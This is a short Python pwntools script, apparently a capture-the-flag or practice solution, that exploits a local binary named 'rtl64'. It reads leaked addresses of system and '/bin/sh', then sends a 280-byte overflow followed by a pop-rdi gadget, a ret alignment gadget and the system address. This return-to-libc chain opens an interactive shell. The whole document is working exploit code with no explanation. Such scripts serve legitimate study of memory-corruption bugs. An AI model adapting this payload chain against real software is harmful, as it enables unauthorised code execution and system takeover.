from pwn import *

p = process("./rtl64")

p.recvuntil("system : ")
system = int(p.recvline().split("\n")[0], 16)
p.recvuntil("binsh : ")
binsh = int(p.recvline().split("\n")[0], 16)

print(hex(system), hex(binsh))

payload = "A" * 280
payload += p64(0x0000000000401343)
payload += p64(binsh)
payload += p64(0x000000000040101a)
payload += p64(system)

pause()

p.sendline(payload)

p.interactive()